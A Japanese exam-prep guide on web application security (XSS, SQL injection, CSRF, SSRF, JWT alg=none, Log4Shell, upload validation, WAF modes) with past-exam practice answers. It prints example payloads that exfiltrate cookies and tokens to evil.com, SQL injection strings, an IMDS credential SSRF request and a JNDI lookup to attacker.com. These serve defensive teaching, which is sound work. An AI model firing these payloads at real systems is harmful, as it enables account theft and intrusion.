XSS（クロスサイトスクリプティング）

攻撃メカニズム

攻撃者の用意したJavaScriptが、被害者のブラウザ上で正規サイトのコンテキストで実行される。Cookie・LocalStorage・DOMにアクセスでき、なりすまし・偽画面・キーロガーを仕込める。

3つの型

反射型 (Reflected)
URLパラメータの値がそのままHTMLに出力される。攻撃者が用意したURLを被害者がクリック → 即発火。
格納型 (Stored)
悪意あるスクリプトがサーバ側DBに保存され、別利用者が閲覧したときに発火。掲示板・SNS・コメント欄が典型。
DOM型 (DOM-based)
サーバを介さずクライアント側JSの欠陥でDOMが書き換わる。location.hash → innerHTML など。

攻撃の典型ペイロード

// 反射型XSS — 検索フォームに反映される脆弱性 https://victim.example.com/search?q=<script>document.location='http://evil.com/?c='+document.cookie</script> // 格納型XSS — 掲示板コメント欄 コメント本文：<img src=x onerror="fetch('http://evil.com/?'+localStorage.token)"> // DOM型XSS — フラグメントを innerHTML に URL: https://victim.example.com/page#<img src=x onerror=alert(1)> JS: document.getElementById('out').innerHTML = location.hash.substring(1);

防御策の体系

対策効果適用箇所
出力時エスケープ（HTML/JS/属性別）最重要・確実サーバ側テンプレート
CSP（Content-Security-Policy）スクリプト実行の制約HTTPレスポンスヘッダ
Cookie HttpOnly属性JSからCookie読取り防止Set-Cookieヘッダ
X-Content-Type-Options: nosniffMIME混同防止レスポンスヘッダ
入力時バリデーション補助的フォーム処理
WAFのXSSパターン検知補完的境界機器
R7秋 問1（実例）：SaaSのファイルアップロード機能で、アップロードしたXLSXファイルを<script src="/files/F1234.xlsx">として読み込ませるという変則的なXSS攻撃が出題。模範解答は「アップロードしたスクリプトファイルをsrc属性で読み込む」。XLSX拡張子だけでなくファイル内容を検証することが対策となった。

記述解答パターン

NG解答

「JavaScriptを実行する」（具体性なし、26字）

「セキュリティを強化する」（抽象的）

OK解答

「攻撃者がスクリプトを埋め込み、被害者のブラウザで実行させてCookieを窃取する」（39字）

「HTML出力時に特殊文字を全てエスケープする」（21字）

R5春 PM2問1 旧過去問より — Cookie属性の3点セット
旧形式時代の経典問題で、WebアプリのCookie属性に関してSecure・HttpOnly・SameSiteを全て付与する根拠を問う出題があった。Secure=平文HTTP通信を防止しMITMでの盗聴を防ぐ。HttpOnly=document.cookie経由のJavaScriptアクセスを禁止しXSSによる窃取を緩和。SameSite=Lax/Strict=他ドメインからのリクエストにCookieを送らないことでCSRFを抑止する。3点セットを暗記レベルで定着させること。新形式でも複合シナリオ内に登場する。

SQLインジェクション

入力値がSQL文の構造を変えてしまうことで、攻撃者がDBに対して任意のクエリを実行できる脆弱性。情報漏えい・改ざん・認証回避が可能。

典型的な脆弱コード（NG）と対策コード（OK）

文字列連結によるSQL組立て（NG）

// PHP の例 $id = $_GET['id']; $sql = "SELECT * FROM users WHERE user_id = '" . $id . "'"; $result = mysqli_query($conn, $sql); // 攻撃者が id='123' OR '1'='1' を渡すと… SELECT * FROM users WHERE user_id = '123' OR '1'='1' → 全件取得されてしまう

プレースホルダ（バインド機構）使用（OK）

// PHP / PDO の例 $stmt = $pdo->prepare("SELECT * FROM users WHERE user_id = :id"); $stmt->bindValue(':id', $_GET['id'], PDO::PARAM_STR); $stmt->execute(); // 攻撃者が "123' OR '1'='1" を渡しても… → 文字列値として安全にDBに渡される。SQL構造は不変。

攻撃ペイロード分類

// 認証バイパス ' OR '1'='1' -- admin' -- // UNION型 — テーブル外データ取得 ' UNION SELECT username, password FROM users -- // ブラインド型 — 真偽値で1bit抽出 ' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a' -- // タイミング型 '; IF(1=1) WAITFOR DELAY '0:0:5' --

対策の優先順位

1
プレースホルダ（バインド機構）の使用　最強かつ確実。動的にテーブル名・カラム名を変える場合はホワイトリスト方式で対応。
2
入力値の型・範囲チェック　数値であればintval()等で型変換。長さ・許可文字種を制限。
3
DBアカウントの最小権限　Webアプリ用アカウントにはSELECT/INSERT/UPDATEのみ。DROPやGRANTを持たせない。
4
エラーメッセージを抑制　DBエラーを利用者画面に出さない。攻撃者にDB構造のヒントを与えない。
5
WAFでパターン検知　補助的だが、未知の脆弱性発生時の保険。
4

CSRF / SSRF

CSRF（クロスサイトリクエストフォージェリ）

ログイン中ユーザのブラウザに意図しないリクエストを送信させる攻撃。被害者は気づかず、自分の権限で操作されてしまう。

被害者
user
罠サイト
evil.com
被害サイト
bank.com
DB
data
①被害者がbank.comにログイン済（Cookie保持）　②evil.comにアクセス　③evil.comのHTMLが「<img src='https://bank.com/transfer?to=evil&amount=1000'>」を含み、自動的にbank.comへPOST　④Cookieが付加されbank.comは正規操作と誤認　⑤送金実行

対策

対策仕組み効果
CSRFトークン（Synchronizer Token）サーバが乱数を発行 → フォーム埋込 → 検証標準的・推奨
Cookie SameSite=Lax/StrictクロスオリジンリクエストでCookie送信を抑止最近のブラウザでデフォルトLax
Refererヘッダ検証送信元URLが自サイトかを確認補助的
再認証・パスワード再入力重要操作で再度認証要求送金等の高リスク操作向け
R4秋 PM1問1 旧過去問より — IoT機器のIPアドレス設定機能でCSRF
旧形式ではIoT製品の管理画面を題材にCSRFが問われた。製品Rは管理画面でログイン状態のユーザの「IPアドレス設定」リクエストを意図確認なしに受理していたため、罠サイトに誘導された管理者経由で攻撃者が任意のIP設定を変更できる構造だった。採点ポイントは「サーバが発行したCSRFトークンの照合」を必ず明記すること。「Refererチェック」「SameSite=Strict」も加点要素となるが、主たる対策はCSRFトークンと書くのが定石。新形式でも同種の出題は十分あり得る。

SSRF（サーバサイドリクエストフォージェリ）

サーバが外部URLを取得する機能を悪用し、攻撃者がサーバから内部リソースへリクエストを投げさせる攻撃。クラウド環境ではIMDS（Instance Metadata Service）への攻撃が深刻。

// SSRFが成立する典型ケース：URLプレビュー機能 POST /preview-url { "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/MyRole" } // AWS EC2のIMDSv1なら、IAMロールの認証情報をサーバが取得し // 攻撃者にレスポンスを返してしまう → 攻撃者がAWS APIを叩ける一時クレデンシャルを取得

SSRF対策

1
取得先URLのホワイトリスト。プロトコル（http/https）・ドメインを制限。
2
プライベートIPブロック。RFC1918・169.254.0.0/16・127.0.0.0/8・::1 への送信を拒否。
3
IMDSv2を強制（AWS）。トークン付きリクエストでなければメタデータを返さない。
4
DNSリバインディング対策。最初に解決したIPを再使用、再解決を許さない。

JWT・APIセキュリティ — alg=NONE攻撃

RESTful APIはステートレスな設計のため、サーバはセッション情報を保持しない。代わりにJWT（JSON Web Token）でリクエストごとに認証情報を運ぶ。JWTには既知の攻撃パターンがいくつかあり、設計を誤ると致命的。

JWTの構造

// JWT は3パート構造（Base64URLエンコード、ドット区切り） eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlcjAxIiwiZXhwIjoxNzAwMDAwMDAwfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c // デコードすると… Header : {"alg":"HS256", "typ":"JWT"} ← 署名アルゴリズム指定 Payload: {"user":"user01", "exp":1700000000} ← 認証情報（改ざん防止のため署名対象） Signature: HMAC-SHA256(Header.Payload, secret) ← サーバの秘密鍵で生成

alg=NONE攻撃 (R6春問1で出題)

JWTのRFC7519は署名なしJWTを許容しており、その場合のalgヘッダ値は"none"。サーバ側のJWT検証ライブラリがalgの値を信じてしまうと、攻撃者が "alg":"none" を指定して署名を空にした偽JWTで認証を通せてしまう。

脆弱なライブラリ実装

Header alg値で署名検証関数を選ぶ → 'none'なら検証スキップ

攻撃者が「{"alg":"none"}.{"user":"admin"}.」を送ると、検証なしで管理者になりすまし

対策後

サーバ側で「使用可能なアルゴリズム＝HS256のみ」と固定

algがNONE以外かつ許可リストに含まれることを検証

R6春 問1 設問2 模範解答（IPA）：「データ：JWTヘッダ内のalgに指定された値／内容：NONEでないことを検証する」。検証ロジックをライブラリQで一元化するのが設計上の正解。

その他のJWT脆弱性

攻撃仕組み対策
alg=none署名なしを許容許可algリスト検証
HS256/RS256混同RS256用のJWTをHS256として検証 → 公開鍵を秘密鍵として扱うalgと鍵種別の対応を厳格化
JWK・kidパラメータ注入外部URLから鍵を取得させるkid解決を信頼済みリストに限定
有効期限なし盗まれたJWTが永続的に利用可exp必須化、短時間有効、リフレッシュトークン
ペイロード改ざん（IDOR）JWTのuser_idを書換え＋他APIで未検証JWTのuser_idと操作対象IDの照合
R6春 問1 設問2 別箇所：「JWTに含まれる利用者IDがmidの値と一致するかどうかを検証する処理」。これは典型的なIDOR（Insecure Direct Object Reference）対策。認証されているかとその操作の権限があるかは別物。

Log4Shell（CVE-2021-44228）

2021年12月に世界中を震撼させた、Java用ログライブラリApache Log4jのRCE脆弱性。R6春問1でほぼ素のまま出題された。

攻撃の仕組み — JNDI＋ログ置換の合わせ技

STEP 1攻撃文字列送信
STEP 2ログ記録時に置換
STEP 3JNDI ルックアップ
STEP 4悪性Javaクラス取得
STEP 5RCE 実行
STEP 1：攻撃文字列をHTTPヘッダに仕込む
攻撃者は次のような文字列を User-Agent や X-Api-Version に入れて送信。
GET / HTTP/1.1 Host: victim.example.com User-Agent: ${jndi:ldap://attacker.com/Exploit}
STEP 2：Webアプリがログ記録
アプリがリクエストヘッダをLog4jで記録 → Log4jの変数置換機能が起動 → ${jndi:...} を「JNDIルックアップ実行」と解釈する。
STEP 3：JNDIが LDAPサーバに問合せ
Log4j（=Java VM）が攻撃者のLDAPサーバ attacker.com へアクセス。これが境界FWを抜けてしまうのが致命的。
STEP 4：悪性JavaクラスのURL取得
攻撃LDAPサーバが「http://attacker.com/Exploit.class をロードしろ」というレスポンスを返す。被害サーバはJavaクラスをHTTP経由でダウンロード。
STEP 5：RCE — 任意コード実行
ロードしたJavaクラスのstatic初期化子が実行される。攻撃者は wget、curl、マルウェア配置、バックドア生成など何でもできる。

WAFでの一時的な対策（R6春問1で出題）

パッチ適用までの間、WAFで攻撃文字列を検知・遮断するのが現実解。問題で問われたのは正規表現パターン。

// 単純パターン（小文字のみ・回避されやすい） ¥Wjndi¥W // 大文字小文字どちらにもマッチ（R6春問1の模範解答パターン） ¥W[jJ][nN][dD][iI]¥W ¥W(j|J)(n|N)(d|D)(i|I)¥W // ただし攻撃者は変数を入れ子にして難読化可能 ${${::-j}ndi:...} ← これは上のパターンを抜ける → 最終対策はLog4jをバージョン2.17.1+に更新
R6春 問1 設問3：WAFの動作を「遮断」ではなく「検知」に設定した利点を問う。模範解答は「誤検知による遮断を防ぐことができる」。検知のみだと攻撃通信が通過するため、別途「アラートを受信したら攻撃かどうかを精査する」運用が必要。

ファイルアップロード脆弱性

「ファイルをアップロードできる」機能は、設計を誤るとRCE（任意コード実行）・XSS・権限迂回に直結する高リスクポイント。R7秋問1の主題でもある。

3層検証（拡張子 / MIME / Magic Number）

ファイル種別の判定は、3つのレイヤすべてで実施する。1つだけでは必ず迂回される。

レイヤ判定対象強度迂回手法
① 拡張子ファイル名末尾弱い「shell.php.jpg」「shell.phtml」「shell.PhP」
② MIMEタイプHTTP Content-Typeヘッダ中程度クライアント側ヘッダは攻撃者が改ざん可能
③ Magic Numberファイル先頭バイト強い多段ファイル（先頭にPNGヘッダ + PHP本文）
3層併用＋実行権限剝奪3層すべて + 保存先設定推奨—

主要ファイルのMagic Number

// 先頭4〜8バイト（16進）でファイル種別を判定 JPEG : FF D8 FF E0 / FF D8 FF E1 PNG : 89 50 4E 47 0D 0A 1A 0A GIF : 47 49 46 38 (37|39) 61 PDF : 25 50 44 46 ("%PDF") ZIP/XLSX/DOCX/JAR : 50 4B 03 04 ("PK..") EXE/PE : 4D 5A ("MZ") ELF : 7F 45 4C 46 (".ELF")

R7秋問1 模範解答：3要素統合

R7秋問1のファイルアップロード対策では、模範解答の中核が「ファイルの内容と拡張子が一致するか確認し、不正な場合はアップロードを拒否する」。これが上の3層検証の設問版。

その他の対策

1
保存先のディレクトリで実行権限を剝奪　Webサーバがphp等を実行できないディレクトリ（chmod 644 など）に保存。
2
保存ファイル名をランダム化　元ファイル名は記録のみ、実体はUUID等のサーバ生成名。
3
ダウンロード時のContent-Disposition　Content-Disposition: attachment でブラウザに「実行ではなく保存」を促す。
4
ファイルサイズ制限　DoS対策として上限を設定（例：10MB）。
5
ウィルススキャン　保存後に ClamAV / 商用AVで検査。
6
サブドメイン分離　ユーザコンテンツは別ドメイン（files.example.com）から配信し、Cookieが共有されないようにする。

WAF — 検知 vs 遮断

WAF（Web Application Firewall）はHTTPレイヤで攻撃パターンを検知する。検知した時の動作モード選択が、運用上の重要論点。

動作通信ログアラート誤検知時の影響
許可（passthrough）通過通常なし—
検知（detection）通過記録送信サービス影響なし
遮断（blocking）遮断記録送信正規通信を止めうる

運用パターン：WAF導入直後は検知モードで1〜2か月運用し、誤検知パターンをチューニングしてから遮断モードへ切替えるのが定石。緊急対応（脆弱性発覚直後）も検知モード＋アラート即応でリスクとサービス影響を両立させる（R6春問1の論点）。

WAF検査対象の指定

WAFルールは「どこを検査するか（HEADER／BODY／URL／QUERY）」「何のパターン（攻撃シグネチャ）」「動作（許可/検知/遮断）」の3要素で構成される。R6春問1の Log4Shell対策では、JNDIがHTTPヘッダに含まれるため、検査対象はHeaderを指定。

過去問記述演習

演習1JWT alg=NONE 対策（R6春問1 設問2類題）
『JWT検証ライブラリQで、algの値が"NONE"のJWTでも検証成功してしまう脆弱性が判明した。Q主任はライブラリQに検証処理を追加することを提案した。』
設問：ライブラリQに追加すべき検証処理を、検証対象データと検証内容に分けて述べよ。
解答例：
検証対象：JWTヘッダ内のalgに指定された値
検証内容：許可されたアルゴリズム以外の値（特にNONE）の場合は検証エラーとする。

採点ポイント：① 検証対象が「ヘッダ内のalg」と特定、② NONEを明示的に拒否する旨。
演習2ファイルアップロードの拡張子偽装（R7秋問1類題）
『SaaS Sでは、ファイルをアップロードする機能が提供されている。アップロード時に拡張子だけをチェックしているが、利用者が "shell.php" を "shell.jpg" にリネームしてアップロードすると、サーバ側で実行可能なファイルが配置される懸念が指摘された。』
設問：拡張子チェックに加えて実装すべき検証処理を50字以内で述べよ。
解答例：ファイルの先頭バイト（Magic Number）を確認し、宣言されたファイル種別と一致しない場合は拒否する。（46字）

採点ポイント：① Magic Number / ファイル内容の検証、② 不一致時に拒否、③ 拡張子だけでは不十分という認識。
演習3SQLインジェクション対策（R5秋問1類題）
『WebアプリケーションWではログイン処理で利用者IDとパスワードを受け取り、文字列連結によりSQL文を組み立ててDBに問合せている。脆弱性診断でSQLインジェクションが指摘された。』
設問：根本対策としてプログラムに対して行うべき修正内容を30字以内で述べよ。
解答例：プレースホルダを利用してSQL文を組み立てるよう修正する。（27字）

採点ポイント：① 「プレースホルダ」「バインド機構」「プリペアドステートメント」のいずれかの語、② 「文字列連結を使わない」または「SQL文を再構築する」旨。
